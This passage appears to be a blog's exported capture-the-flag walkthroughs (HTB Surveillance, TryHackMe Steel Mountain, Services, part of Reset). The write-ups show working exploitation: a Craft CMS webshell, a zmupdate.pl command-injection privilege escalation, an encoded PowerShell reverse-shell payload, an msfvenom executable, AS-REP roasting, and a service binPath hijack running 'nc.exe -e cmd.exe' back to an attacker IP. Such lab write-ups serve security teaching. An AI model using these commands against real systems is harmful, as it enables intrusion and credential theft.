site:![Image](Pasted%20image%2020240218223934.png)_surveillance HTB_While accessing port 80:![Image](Pasted%20image%2020240218224103.png)_While hovering over `Craft CMS`, I identified its version and the source code._Further reconnaissance revealed a potential exploit related to `Craft CMS` version 4.4.14, vulnerable to CVE-2023-41892. An exploit enabling remote code execution was discovered ([Exploit](https://github.com/Faelian/CraftCMS_CVE-2023-41892/tree/main)).Resulting in remote code execution, providing access to the shell:```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Surveillance]â””â”€$ python3 exploit.py http://surveillance.htb[+] Executing phpinfo to extract some config infostemporary directory: /tmpweb server root: /var/www/html/craft/web[+] create shell.php in /tmp[+] trick imagick to move shell.php in /var/www/html/craft/web[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami[+] Remember to delete shell.php in /var/www/html/craft/web when you are done[!] Enjoy your shell> wget http://10.10.14.81/php_webshell.php> lscpresourcescssfontsimagesimgindex.phpjsshell.phpweb.config> ```{: .nolineno}An `sql` file was found at `/var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip`, containing sensitive data, including password hashes.I immediately copy the `zip` file into the website location like this and downloaded it through website ->```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Surveillance]â””â”€$ python3 exploit.py http://surveillance.htb/[+] Executing phpinfo to extract some config infostemporary directory: /tmpweb server root: /var/www/html/craft/web[+] create shell.php in /tmp[+] trick imagick to move shell.php in /var/www/html/craft/web[+] Webshell is deployed: http://surveillance.htb//shell.php?cmd=whoami[+] Remember to delete shell.php in /var/www/html/craft/web when you are done[!] Enjoy your shell> cp ../storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip .> lscpresourcescssfontsimagesimgindex.phpjsshell.phpsurveillance--2023-10-17-202801--v4.4.14.sql.zipweb.config```{: .nolineno}I got this sql data from this file that contains the password hash of matthew â¬ ```sql---- Dumping data for table `users`--LOCK TABLES `users` WRITE;/*!40000 ALTER TABLE `users` DISABLE KEYS */;set autocommit=0;INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');/*!40000 ALTER TABLE `users` ENABLE KEYS */;UNLOCK TABLES;commit;```{: .nolineno}Using the site [hashes.com](https://hashes.com/en/decrypt/hash) to crack the password hash revealed: `starcraft122490`.ðŸ”»![Image](Pasted%20image%2020240217215356.png)Subsequently, accessing SSH as **matthew**: ## SSH SHELL ðŸ”œ```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Surveillance]â””â”€$ ssh matthew@10.10.11.245 matthew@10.10.11.245 is password: Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Feb 18 05:15:29 PM UTC 2024 System load: 1.23828125 Processes: 260 Usage of /: 84.2% of 5.91GB Users logged in: 0 Memory usage: 68% IPv4 address for eth0: 10.10.11.245 Swap usage: 0%Expanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sun Feb 18 16:32:58 2024 from 10.10.14.181matthew@surveillance:~$ whoamimatthewmatthew@surveillance:~$ iduid=1000(matthew) gid=1000(matthew) groups=1000(matthew)matthew@surveillance:~$ ls -altotal 28drwxrwx--- 3 matthew matthew 4096 Nov 9 12:45 .drwxr-xr-x 4 root root 4096 Oct 17 11:20 ..lrwxrwxrwx 1 matthew matthew 9 May 30 2023 .bash_history -> /dev/null-rw-r--r-- 1 matthew matthew 220 Apr 21 2023 .bash_logout-rw-r--r-- 1 matthew matthew 3771 Apr 21 2023 .bashrcdrwx------ 2 matthew matthew 4096 Sep 19 11:26 .cache-rw-r--r-- 1 matthew matthew 807 Apr 21 2023 .profile-rw-r----- 1 root matthew 33 Feb 18 16:32 user.txtmatthew@surveillance:~$ ```{: .nolineno}After successfully logging in, I identified additional users, including `zoneminder`, and obtained credentials from `/usr/share/zoneminder/www/api/app/Config/database.php`. ðŸ”½ ```bashmatthew@surveillance:~$ find / -group zoneminder -type f 2>/dev/null/usr/share/zoneminder/www/fonts/material-icons.woff2/usr/share/zoneminder/www/fonts/fontawesome-webfont.woff/usr/share/zoneminder/www/fonts/fontawesome-webfont.eot......./usr/share/zoneminder/www/api/lib/Cake/Config/config.php/usr/share/zoneminder/www/api/app/Config/database.php```{: .nolineno}I looked into this `database.php` file and got some credentials ->```phpmatthew@surveillance:~$ cat /usr/share/zoneminder/www/api/app/Config/database.php 'Database/Mysql',\t\t'persistent' => false,\t\t'login' => ZM_DB_USER,\t\t'password' => ZM_DB_PASS,\t\t'database' => ZM_DB_NAME,\t\t'ssl_ca' => ZM_DB_SSL_CA_CERT,\t\t'ssl_key' => ZM_DB_SSL_CLIENT_KEY,\t\t'ssl_cert' => ZM_DB_SSL_CLIENT_CERT,\t\t'prefix' => '',\t\t'encoding' => 'utf8',\t);*/\tpublic $test = array(\t\t'datasource' => 'Database/Mysql',\t\t'persistent' => false,\t\t'host' => 'localhost',\t\t'login' => 'zmuser',\t\t'password' => 'ZoneMinderPassword2023',\t\t'database' => 'zm',\t\t'prefix' => '',\t\t//'encoding' => 'utf8',\t);\tpublic function __construct() {\t\tif (strpos(ZM_DB_HOST, ':')):\t\t\t$array = explode(':', ZM_DB_HOST, 2); if (ctype_digit($array[1])):\t\t\t\t$this->default['host'] = $array[0];\t\t\t\t$this->default['port'] = $array[1];\t\t\telse:\t\t\t\t$this->default['unix_socket'] = $array[1];\t\t\tendif;\t\telse:\t\t\t$this->default['host'] = ZM_DB_HOST;\t\tendif;\t}}matthew@surveillance:~$```{: .nolineno}Now I need to search for `zoneminder` running version ->![Image](Pasted%20image%2020240218220925.png)_zoneminder has Version 1.36.32_Exploring further, I discovered `zoneminder` version 1.36.32, vulnerable to [CVE-2023-26035](https://github.com/rvizx/CVE-2023-26035).I used this exploit and I got the reverse shell like this ðŸ”»![Image](Pasted%20image%2020240218221500.png)_Unauthenticated Remote Code Execution through exploit_Exploiting this vulnerability, I gained root access and retrieved the root flag:```bashzoneminder@surveillance:/usr/share/zoneminder/www$ sudo -lsudo -lMatching Defaults entries for zoneminder on surveillance: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser zoneminder may run the following commands on surveillance: (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *zoneminder@surveillance:/usr/share/zoneminder/www$ ```{: .nolineno}I find the same files and I got these ->```bashzoneminder@surveillance:/usr/share/zoneminder/www$ find /usr/bin/zm[a-zA-Z]*.pl```bashsudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023```{: .nolineno}Now lets see the result âž¡ï¸```bashzoneminder@surveillance:/usr/share/zoneminder/www$ sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Surveillance/CVE-2023-26035]â””â”€$ rlwrap nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.181] from (UNKNOWN) [10.10.11.245] 52892/bin/sh: 0: can not access tty; job control turned off# whoamiroot# iduid=0(root) gid=0(root) groups=0(root)# cd ~# ls -altotal 40drwx------ 7 root root 4096 Feb 18 16:32 .drwxr-xr-x 18 root root 4096 Nov 9 13:19 ..lrwxrwxrwx 1 root root 9 Sep 6 10:33 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Oct 15 2021 .bashrcdrwx------ 3 root root 4096 Sep 19 11:32 .cachedrwxr-xr-x 3 root root 4096 Sep 19 11:31 .configdrwxr-xr-x 3 root root 4096 Sep 8 00:05 .locallrwxrwxrwx 1 root root 9 Oct 17 16:43 .mysql_history -> /dev/null-rw-r--r-- 1 root root 161 Jul 9 2019 .profile-rw-r----- 1 root root 33 Feb 18 16:32 root.txtdrwxr-xr-x 2 root root 4096 Oct 21 23:19 .scriptsdrwx------ 2 root root 4096 Nov 7 20:07 .ssh# cat root.txcat: root.tx: No such file or directory# cat root.txt8022945623be5ae2e721aca14e22693e# ```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Steel Mountain", "url": "/posts/Steel-Mountain/", "categories": "TryHackMe", "tags": "Windows, HFS, Unquoted_Service_Path, Public Exploit, PrivEsc", "date": "2024-03-06 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/steel_mountain]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.161.188 -Pn[sudo] password for kali: Starting Nmap 7.94SV...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/steel_mountain]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.161.188 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-04 10:35 ISTNmap scan report for 10.10.161.188Host is up (0.17s latency).Not shown: 65520 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 8.5| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/8.5|_http-title: Site doesnt have a title (text/html).135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds3389/tcp open ssl/ms-wbt-server?|_ssl-date: 2024-03-04T05:22:19+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=steelmountain| Not valid before: 2024-03-03T05:04:55|_Not valid after: 2024-09-02T05:04:55| rdp-ntlm-info: | Target_Name: STEELMOUNTAIN| NetBIOS_Domain_Name: STEELMOUNTAIN| NetBIOS_Computer_Name: STEELMOUNTAIN| DNS_Domain_Name: steelmountain| DNS_Computer_Name: steelmountain| Product_Version: 6.3.9600|_ System_Time: 2024-03-04T05:22:13+00:005985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.08080/tcp open http HttpFileServer httpd 2.3|_http-title: HFS /|_http-server-header: HFS 2.347001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49156/tcp open msrpc Microsoft Windows RPC49169/tcp open msrpc Microsoft Windows RPC49170/tcp open msrpc Microsoft Windows RPCService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2024-03-04T05:22:15|_ start_date: 2024-03-04T05:04:45| smb2-security-mode: | 3:0:2: |_ Message signing enabled but not required| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: , NetBIOS MAC: 02:31:ea:79:46:4d (unknown)```{: .nolineno}## Web Enumeration â¤µï¸while checking port 8080 I got this HFS file server site and its version noticeable ->![Image](Pasted%20image%2020240304120004.png)I enumerated web file serve version on web and got this exploit related to it ->[HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)](https://www.exploit-db.com/exploits/49584)```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/steel_mountain]â””â”€$ python3 exploit2.py Encoded the command in base64 format...Encoded the payload and sent a HTTP GET request to the target...Printing some information for debugging...lhost: 10.11.75.200lport: 4444rhost: 10.10.161.188rport: 8080payload: exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAxAC4ANwA1AC4AMgAwADAAIgAsADQANAA0ADQAKQA7ACAAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAIABbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7ACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsADAALAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkAOwAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACAAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAListening for connection...listening on [any] 4444 ...connect to [10.11.75.200] from (UNKNOWN) [10.10.161.188] 49297PS C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup> whoamisteelmountain\\billPS C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup> hostnamesteelmountainPS C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup> ```{: .nolineno}I uploaded winpeas.exe Tool to enumerate further and I got some info ðŸ”½![Image](Pasted%20image%2020240304104921.png)I also got this unquoted service path vulnerability so lets exploit that ->![Image](Pasted%20image%2020240304105129.png)I created the Reverse shell payload that will replace the Advanced Systemcare to Advanced.exe and it will execute as Administrator ->```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/steel_mountain]â””â”€$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.75.200 LPORT=445 -e x86/shikata_ga_nai -f exe -o Advanced.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadFound 1 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 351 (iteration=0)x86/shikata_ga_nai chosen with final size 351Payload size: 351 bytesFinal size of exe file: 73802 bytesSaved as: Advanced.exe```{: .nolineno}Lets upload it now ->![Image](Pasted%20image%2020240304115351.png)I got response on my netcat listener on port 445 ->```powershellC:\\Windows\\system32>whoamiwhoamint authority\\systemC:\\Windows\\system32>cd C:\\Users\\Administratorcd C:\\Users\\AdministratorC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 0000000A 2E4A:906AC:.+---Contacts+---Desktop| activation.ps1| root.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| RecentPlaces.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>type Desktop\\root.txttype Desktop\\root.txt9af5f314f57607c00fd09803a587db80C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Services", "url": "/posts/Services/", "categories": "TryHackMe", "tags": "netexec, PrivEsc, ASREPRoast, GetNPUsers.py, Service_Operators, Windows", "date": "2024-03-06 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Service]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.239.246 -PnNmap scan report for 10.10.239.246Host is up (0.17s l...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Service]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.239.246 -PnNmap scan report for 10.10.239.246Host is up (0.17s latency).Not shown: 65509 closed tcp ports (reset)PORT STATE SERVICE VERSION88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-21 07:36:34Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: SERVICES| NetBIOS_Domain_Name: SERVICES| NetBIOS_Computer_Name: WIN-SERVICES| DNS_Domain_Name: services.local| DNS_Computer_Name: WIN-SERVICES.services.local| DNS_Tree_Name: services.local| Product_Version: 10.0.17763|_ System_Time: 2024-02-21T07:37:25+00:00| ssl-cert: Subject: commonName=WIN-SERVICES.services.local| Not valid before: 2024-02-20T07:21:03|_Not valid after: 2024-08-21T07:21:03|_ssl-date: 2024-02-21T07:37:33+00:00; 0s from scanner time.5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.049664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049671/tcp open msrpc Microsoft Windows RPC49673/tcp open msrpc Microsoft Windows RPC49674/tcp open msrpc Microsoft Windows RPC49677/tcp open msrpc Microsoft Windows RPC49694/tcp open msrpc Microsoft Windows RPC49703/tcp open msrpc Microsoft Windows RPCService Info: Host: WIN-SERVICES; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2024-02-21T07:37:27|_ start_date: N/A| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required```{: .nolineno}## Web Enumeration â¤µï¸I enumerated the port 80 and in contact part I noticed an email ID like this j.doe@services.local and from about.html page I got some users like these ðŸ”»![Image](Pasted%20image%2020240221131446.png)_Users from about.html page_I made a users.txt file that include the usernames as Joanne Doe to j.doe like I suspected so I made all the users have that format of username .```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Service]â””â”€$ cat users.txt j.doej.rockw.mastersj.larusso ```{: .nolineno}Now I have to look for `ASRep-Rosting` for that I performed `GetNPUsers.py` with that username file and I got this result â¬ ```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Service]â””â”€$ /opt/Tools/impacket/examples/GetNPUsers.py -no-pass 'services.local/' -dc-ip 10.10.239.246 -request -usersfile users.txtImpacket v0.11.0 - Copyright 2023 Fortra[-] User j.doe does not have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$j.rock@SERVICES.LOCAL:5bf80cb45d84a6e9e02eab6ed07f7978$9fd9582043ab1891ac419b2bd3b016cca950eb0718c5e204c977e77cb32b1cede5b471b6369b4f2817c6cccd7273a49e6c6384fb99393375cda5476ac0c1491c3a2f6e3ea3b4f80e72bc1fc35e71a43ff0ee3fde1d762c2318ed8c7ba34f388b689f8e3d1e09dbaf1ce4060531fa96f1a6538a55afc872fa97ba8bfb200b5bd12d39a296e69e5017c114b0305f85d06b9ac841e72e9fd2075265a0b08bbfc04537cecfc2934d70a52ad43c1df13b24ebf51f9bc1c0a324c9a34fdf0d42495d2943d92c1e612acd9ffbbe1ef1f1341aac2fc396a5d42dd6705f849d0cf2c5dc7f4f932c5cc6............9[-] User w.masters does not have UF_DONT_REQUIRE_PREAUTH set[-] User j.larusso does not have UF_DONT_REQUIRE_PREAUTH set```{: .nolineno}So lets crack this ticket now with john the ripper tool â©```bash â”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Service]â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txtUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])Will run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for status ($krb5asrep$23$j.rock@SERVICES.LOCAL) 1g 0:00:00:34 DONE (2024-02-21 13:11) 0.02913g/s 309079p/s 309079c/s 309079C/s SexieEyez1..Sergio03Use the \"--show\" option to display all of the cracked passwords reliablySession completed. ```{: .nolineno}Lets see what privileges does this user have ->![Image](Pasted%20image%2020240221132653.png)_Netexec Tool to check the smb,winrm permissions._Lets have a winrm-session ->![Image](Pasted%20image%2020240221132539.png)_evil-winrm Tool that gives the access for winrm service_Lets access some flags ->```powershell*Evil-WinRM* PS C:\\Users\\j.rock> tree /f /aFolder PATH listingVolume serial number is A8A4-C362C:.+---Desktop| EC2 Feedback.website| EC2 Microsoft Windows Guide.website| user.txt|+---Documents+---Downloads+---Favorites+---Links+---Music+---Pictures+---Saved Games\\---Videos*Evil-WinRM* PS C:\\Users\\j.rock>```{: .nolineno}I checked the privileges and got to know that this user is part of service operators group so I can leverage that part to get to Administrator like this ->![Image](Pasted%20image%2020240221141224.png)_whoami /all command , part of Service Operators group_Now I will see the services running on this machine that will works as a beacon to execute my payload like this ->![Image](Pasted%20image%2020240221141435.png)_services running on this system_I will be using cfn-hup service to change its path to my payload and for payload I need to upload `nc.exe` in this machine ðŸ”½```powershell*Evil-WinRM* PS C:\\Users\\j.rock> upload ../../../../../../usr/share/windows-binaries/nc.exe Info: Uploading /home/kali/Downloads/Tryhackme/Service/../../../../../../usr/share/windows-binaries/nc.exe to C:\\Users\\j.rock\\nc.exe Data: 79188 bytes of 79188 bytes copied Info: Upload successful!*Evil-WinRM* PS C:\\Users\\j.rock>*Evil-WinRM* PS C:\\Users\\j.rock> sc.exe config cfn-hup binPath=\"C:\\\\Users\\\\j.rock\\\\nc.exe -e cmd.exe 10.14.72.139 445\"[SC] ChangeServiceConfig SUCCESS*Evil-WinRM* PS C:\\Users\\j.rock> sc.exe stop cfn-hup*Evil-WinRM* PS C:\\Users\\j.rock> sc.exe start cfn-hup[SC] StartService FAILED 1053:The service did not respond to the start or control request in a timely fashion.*Evil-WinRM* PS C:\\Users\\j.rock>```{: .nolineno}For at most 10-15 sec the reverse shell is active then the service did not response in that while I enumerated the Administrators filesystem like this ðŸ”»```powershellâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/Tryhackme/Service]â””â”€$ rlwrap nc -lvnp 445 listening on [any] 445 ...connect to [10.14.72.139] from (UNKNOWN) [10.10.239.246] 61223Microsoft Windows [Version 10.0.17763.4010](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32>whoamiwhoamint authority\\systemC:\\Windows\\system32>hostnamehostnameWIN-SERVICESC:\\Windows\\system32>C:\\Windows\\system32>cd C:\\Users\\Administratorcd C:\\Users\\AdministratorC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is FFFFFFFE A8A4:C362C:.+---3D Objects+---Contacts+---Desktop| EC2 Feedback.website| EC2 Microsoft Windows Guide.website| root.txt| +---Documents| \\---WindowsPowerShell| +---Modules| | \\---psprivilege| | \\---0.2.0| | | PSPrivilege.Format.ps1xml| | | PSPrivilege.psd1| | | PSPrivilege.psm1| | | | | +---bin| | | +---net472| | | | PSPrivilege.dll| | | | PSPrivilege.pdb| | | | | | | \\---netcoreapp3.1| | | PSPrivilege.deps.json| | | PSPrivilege.dll| | | PSPrivilege.pdb| | | | | \\---en-US| | about_PSPrivilege.help.txt| | PSPrivilege.dll-Help.xml| | | \\---Scripts| \\---InstalledScriptInfos+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>cd Desktopcd DesktopC:\\Users\\Administrator\\Desktop>type root.txttype root.txtTHM{}C:\\Users\\Administrator\\Desktop>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Reset", "url": "/posts/Reset/", "categories": "TryHackMe", "tags": "GetST.py, Forced_Change_Password, Active Directory, ASREPRoast, GetNPUsers.py, SMB, GenericAll, AllowedToDelegate, PrivEsc", "date": "2024-03-06 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Reset]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.199.27 -Pn [sudo] password for kali: Starting Nmap 7.94SVN ( https...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Reset]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.199.27 -Pn [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 15:25 ISTNmap scan report for 10.10.199.27Host is up (0.18s latency).Not shown: 65514 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-29 10:00:23Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Services|_ssl-date: 2024-02-29T10:01:58+00:00; +1s from scanner time.| ssl-cert: Subject: commonName=HayStack.thm.corp| Not valid before: 2024-01-25T21:01:31|_Not valid after: 2024-07-26T21:01:31| rdp-ntlm-info: | Target_Name: THM| NetBIOS_Domain_Name: THM| NetBIOS_Computer_Name: HAYSTACK| DNS_Domain_Name: thm.corp| DNS_Computer_Name: HayStack.thm.corp| DNS_Tree_Name: thm.corp| Product_Version: 10.0.17763|_ System_Time: 2024-02-29T10:01:18+00:005985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing49669/tcp open msrpc Microsoft Windows RPC49670/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049671/tcp open msrpc Microsoft Windows RPC49673/tcp open msrpc Microsoft Windows RPC49675/tcp open msrpc Microsoft Windows RPC49702/tcp open msrpc Microsoft Windows RPC59591/tcp open msrpc Microsoft Windows RPCService Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2024-02-29T10:01:21|_ start_date: N/A| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required```{: .nolineno}## SMB Enumeration â¤µï¸I checked the domain name with no cred access and I got the domain name with 